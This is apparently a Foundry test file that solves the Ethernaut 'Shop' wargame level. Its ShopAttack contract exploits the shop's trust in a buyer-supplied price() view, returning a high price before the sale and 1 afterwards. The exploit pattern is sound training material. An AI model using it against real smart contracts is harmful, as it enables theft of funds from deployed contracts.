// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {EthernautTest} from "./utils/EthernautTest.sol";
import {ShopFactory} from "../src/factories/ShopFactory.sol";
import {Shop} from "../src/levels/Shop.sol";

import "forge-std/console.sol";

contract ShopTest is EthernautTest {
    function setUp() public override {
        super.setUp();
        ShopFactory factory = new ShopFactory();
        ethernaut.registerLevel(factory);
        levelAddress = ethernaut.createLevelInstance(factory);
    }

    function testSolveShop() public {
        Shop shop = Shop(payable(levelAddress));

        // [START]

        // 1. Deploy attacker contract
        ShopAttack attacker = new ShopAttack(address(shop));

        // 2. Call attack
        attacker.attack();

        // [END]

        assert(ethernaut.submitLevelInstance(payable(levelAddress)));
    }
}

// Attack contract
contract ShopAttack {
    address shopAddr;

    constructor(address _shop) {
        shopAddr = _shop;
    }

    function price() external view returns (uint _price) {
        (, bytes memory returnData) = shopAddr.staticcall(
            abi.encodeWithSignature("isSold()")
        );
        bool isSold = abi.decode(returnData, (bool));
        _price = isSold ? 1 : 100;
    }

    function attack() external {
        (bool success, ) = shopAddr.call(abi.encodeWithSignature("buy()"));
        require(success);
    }
}
